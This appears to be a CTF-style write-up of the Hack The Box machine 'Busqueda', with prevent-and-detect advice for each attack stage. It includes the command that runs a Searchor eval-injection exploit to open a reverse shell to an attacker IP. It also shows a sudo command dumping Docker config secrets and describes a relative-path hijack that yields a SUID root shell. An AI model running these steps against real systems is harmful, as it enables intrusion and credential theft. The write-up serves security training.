### Overview

This is an easy Linux machine from Hack The Box where an exploit used for the Searchor Python library assists with initial access. I thought this was an interesting box because it required hunting around for passwords and applying them appropriately. Password misuse can be difficult to detect and highlights the need for secrets management and adherence to standards for prevention.

### Attack Tactics

#### Initial Access
I used this [Searchor exploit](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection) which includes a brief explanation of the vulnerability. In the affected Searchor library it uses an `eval` function without input validation. As noted in the [documentation](https://docs.python.org/3/library/functions.html#eval) there is a warning that this may lead to vulnerabilities. The `exploit.sh` script provides the syntax to inject a reverse shell into the searcher.htb site's "query" parameter. The Bash reverse shell is executed by importing the Python `os` module, which in turn runs on the underlying Ubuntu OS. Base64 is used to avoid special characters in the reverse shell syntax from interfering with the Python syntax.

When the exploit is ran:
```
./exploit.sh http://searcher.htb 10.10.14.22 443
```
the curl POST request used for delivery can be seen in a packet capture:

> __Prevent:__ The most straightforward way to prevent this attack is using an updated Searchor version.
{: .prompt-tip}
The [patch](https://github.com/ArjunSharda/Searchor/pull/130/files) on GithHub shows where the `eval` function is replaced with the Engine class directly. The same `search` function is used to get the returned url value. This will pass the user input as is rather than interpretting it as Python code.

> __Detect:__ A detection strategy could be used with Zeek, an open-source network monitoring tool, to log this activity.
{: .prompt-tip}
The Bro script listed [here](https://community.zeek.org/t/http-post-data/2256/4) (Bro being the former name for Zeek) provides an example option to log POST data. Using the same packet capture from above and running the Zeek/Bro script against it outputs an `http.log`:
```
zeek -C -r poc.sh.pcap http-extract-post.zeek
```
- `-C` tells Zeek to ignore invalid IP checksums
- `-r` reads a given packet capture

The built-in Zeek command line tool `zeek-cut` allows for filtering on specified column names:
```
cat http.log | zeek-cut id.resp_h id.resp_p method host uri user_agent post_body
```

#### Credential Access

With low privilege access gained from the exploit, file system enumeration would lead to finding credentials for cody's account in the git config file for the web app. Checking for password re-use with `sudo -l` verifies cody's password is valid for the current low privilege `svc` account. The available sudo privileges also shows a custom Python script that can be ran:

```
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

After uncovering what the script parameters are and referring to the Docker [documentation](https://docs.docker.com/reference/cli/docker/inspect/#get-a-subsection-in-json-format), a command can be ran to get sensitive config details referencing the first three digits of a running container name:
{% raw %}
```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{.Config}}' 960
```
{% endraw %}

Using a Key Vault for secrets storage may be easier said than done but would be one option to help mitigate clear-text credentials being stored insecurely.

> __Detect:__ A review of authentication logs could help identify suspicious sudo usage. 
{: .prompt-tip}
This may be more of a post forensics review but the timing and execution from an unusual path would likely be an outlying event:

#### Privilege Escalation

A resulting password found in the Docker config details enables access to the source code for the gitea repository. This shows that `full-chechup.sh` is ran from a relative path:

With this knowledge a custom `full-checkup.sh` can be written in a writable path. Runnning `/opt/scripts/system-checkup.py full-checkup` from that writable path the custom script can be used to escalate privileges. The script I ran enabled SUID permissions on a copy of `/bin/bash` and this was ran from `/var/tmp`.
> __Prevent:__ A simple way to prevent this would be to update `system-checkup.py` to run `full-checkup.sh` from an absolute path while ensuring permissions are controlled appropriately on the the Bash script.
